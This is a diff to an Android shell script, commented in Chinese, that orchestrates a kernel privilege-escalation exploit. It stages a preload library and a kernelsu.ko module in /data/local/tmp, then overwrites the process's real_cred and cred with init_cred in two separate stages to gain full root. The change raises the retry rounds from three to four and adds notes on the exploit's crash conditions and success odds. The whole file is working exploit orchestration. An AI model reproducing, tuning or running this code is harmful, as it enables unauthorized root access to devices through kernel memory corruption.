@@ -1,11 +1,12 @@
 #!/system/bin/sh
-# mt49: 双写两阶段 — 一进程一写 (crash#2 教训)
+# mt49: 双写两阶段 — 一进程一写 (crash#2 教训, pstore 实锤见 PRIOCHAIN_VERDICT)
 #   阶段R: fork 子进程 + 写 real_cred=init_cred  (独立进程, RETRY=1)
 #   阶段C: 外部模式写 cred=init_cred            (独立进程, RETRY=1, PSELECT_TASK)
 #   两写落地 → real==cred==init_cred → commit_creds 的 BUG_ON cmp 相等 →
 #   子进程 gate(满帽 AND euid==0) 触发 → setresgid/setresuid 安全 → 全套 root
-# 同进程多 attempt 已判死: v37_* 静态 futex 词不清 → 第二次触发 rb_insert 在中毒
-# 树上 rebalance → 旋转写坏 task+0x770..0x788 → panic (见 MT49_ADJUDICATION)
+# 同进程多 attempt 已判死 (pstore): 二触后任何 sched_setattr → prio_chain 在
+# 毒树上踩中 +0x1788 断言 (top_waiter->lock != lock) → brk#0x800。一进程一写
+# 则时序/进程/引用三重隔离, 结构性免疫。
 SRC=/sdcard/Documents/matisse_backup_essentials/preload_mt49.so
 DST=/data/local/tmp/preload.so
 KO=/data/local/tmp/kernelsu.ko
@@ -58,7 +59,8 @@ KOARG=""
 
 # ---------- STAGE-R: real_cred → init_cred ----------
 # 第 1 轮 fork 子进程(存活 8min, 持续写状态文件); 未落地则外部模式补打(幂等)
-for RA in 1 2 3; do
+# 单发命中 ~20-40% → 4 轮累计 59-87%; 每轮独立进程, 不破一进程一写
+for RA in 1 2 3 4; do
   rm -f $RUNLOG
   TASKARG=""
   [ $RA -gt 1 ] && TASKARG="PSELECT_TASK=$(getfield task)"
@@ -85,18 +87,18 @@ for RA in 1 2 3; do
     *1fffff*) echo "★★★ STAGE-R LANDED (real_cred=init_cred) round=$RA ★★★" >> $LOG; break;;
   esac
   # 状态文件没有 task 地址 → 子进程没起来, 重跑 fork 模式
-  [ -z "$(getfield task)" ] && [ $RA -lt 3 ] && continue
+  [ -z "$(getfield task)" ] && [ $RA -lt 4 ] && continue
 done
 CAPE=$(getfield CapEff)
 case "$CAPE" in
   *1fffff*) : ;;
-  *) echo "!! STAGE-R 3轮未落地 — 换 boot 重跑全套" >> $LOG; exit 1 ;;
+  *) echo "!! STAGE-R 4轮未落地 — 换 boot 重跑全套" >> $LOG; exit 1 ;;
 esac
 
 # ---------- STAGE-C: cred → init_cred (外部模式, 同一子进程) ----------
 TASK=$(getfield task)
 echo "STAGE-C task=$TASK" >> $LOG
-for CA in 1 2 3; do
+for CA in 1 2 3 4; do
   rm -f $RUNLOG
   timeout 120 env \
     PSELECT_SLIDE_TRIGGER=1 \
